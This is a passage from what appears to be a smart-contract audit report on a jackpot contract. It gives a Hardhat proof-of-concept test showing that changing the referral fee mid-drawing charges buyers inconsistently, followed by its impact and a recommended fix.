    jackpotLPManager = jackpotSystem.jackpotLPManager;
    payoutCalculator = jackpotSystem.payoutCalculator;
    usdcMock = jackpotSystem.usdcMock;
    entropyProvider = jackpotSystem.entropyProvider;

    await jackpot
      .connect(owner.wallet)
      .initialize(
        usdcMock.getAddress(),
        await jackpotLPManager.getAddress(),
        await jackpotNFT.getAddress(),
        entropyProvider.getAddress(),
        await payoutCalculator.getAddress(),
      );

    await jackpot.connect(owner.wallet).initializeLPDeposits(usdc(10000000));

    await usdcMock
      .connect(owner.wallet)
      .approve(jackpot.getAddress(), usdc(1000000));
    await jackpot.connect(owner.wallet).lpDeposit(usdc(1000000));

    await jackpot
      .connect(owner.wallet)
      .initializeJackpot(
        BigInt(await time.latest()) +
          BigInt(jackpotSystem.deploymentParams.drawingDurationInSeconds),
      );

    jackpotBridgeManager =
      await jackpotSystem.deployer.deployJackpotBridgeManager(
        await jackpot.getAddress(),
        await jackpotNFT.getAddress(),
        await usdcMock.getAddress(),
        "MegapotBridgeManager",
        "1.0.0",
      );

    mockDepository = await jackpotSystem.deployer.deployMockDepository(
      await usdcMock.getAddress(),
    );

    snapshot = await takeSnapshot();
  });

  beforeEach(async () => {
    await snapshot.restore();
  });

  describe("PoC", async () => {
    let buyerOneTicketInfo: Ticket[];
    let buyerOneTicketIds: bigint[];

    let buyerTwoTicketInfo: Ticket[];
    let buyerTwoTicketIds: bigint[];
    
    it("Fees will not be consistent throughout drawing if referralFee is updated", async () => {
        await usdcMock.connect(owner.wallet).transfer(buyerOne.address, usdc(1000));
        await usdcMock.connect(owner.wallet).transfer(buyerTwo.address, usdc(1000));
        
        buyerOneTicketInfo = [
            {
              normals: [BigInt(1), BigInt(2), BigInt(5), BigInt(7), BigInt(9)],
              bonusball: BigInt(1)
            } as Ticket
          ];
        buyerTwoTicketInfo = [
            {
              normals: [BigInt(6), BigInt(7), BigInt(8), BigInt(10), BigInt(20)],
              bonusball: BigInt(1)
            } as Ticket
          ];

        // buyerOne puchases 1 ticket
        await usdcMock.connect(buyerOne.wallet).approve(jackpot.getAddress(), usdc(10));
        await jackpot.connect(buyerOne.wallet).buyTickets(
            buyerOneTicketInfo, // 1 ticket
            buyerOne.address,
            [referrerOne.address], // 1 referrer
            [ether(1)],
            ethers.encodeBytes32String("test")
          );

        // initialized to 0.065e18 -> increased to 0.1e18
        // buyerTwo will be charged a higher fee than buyerOne for the same drawingId
        await jackpot.connect(owner.wallet).setReferralFee(ether(0.1));

        // buyerTwo purchases 1 ticket
        await usdcMock.connect(buyerTwo.wallet).approve(jackpot.getAddress(), usdc(10));
        await jackpot.connect(buyerTwo.wallet).buyTickets(
            buyerTwoTicketInfo, // 1 ticket
            buyerTwo.address,
            [referrerTwo.address], // 1 referrer 
            [ether(1)],
            ethers.encodeBytes32String("test")
          );

        // claim referral fees
        await jackpot.connect(referrerOne.wallet).claimReferralFees();
        await jackpot.connect(referrerTwo.wallet).claimReferralFees();

        let referrerOneBalance = await usdcMock.balanceOf(referrerOne.address);
        let referrerTwoBalance = await usdcMock.balanceOf(referrerTwo.address);
        expect(referrerOneBalance).to.not.equal(referrerTwoBalance);
    });
  });
});

```

## Impact

Users may be charged different referral fees for the same drawing, which introduces unfairness to the system. 

Users may not be refunded the correct amounts on emergency withdraw.

## Tools Used

Manual Review

## Recommendation

Consider extending the `drawingState` struct to include a `referralFee` , which will remain static throughout the drawing process.
